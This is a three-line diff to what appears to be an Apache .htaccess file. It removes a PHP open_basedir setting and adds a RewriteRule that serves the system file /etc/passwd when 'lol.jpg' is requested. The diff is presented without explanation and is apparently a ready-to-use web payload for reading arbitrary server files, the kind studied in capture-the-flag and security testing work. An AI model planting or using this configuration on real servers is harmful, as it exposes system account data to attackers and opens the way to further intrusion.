@@ -1,1 +1,3 @@
-php_value open_basedir "/"
+Options +FollowSymlinks
+RewriteEngine on
+RewriteRule lol.jpg file:/etc/passwd
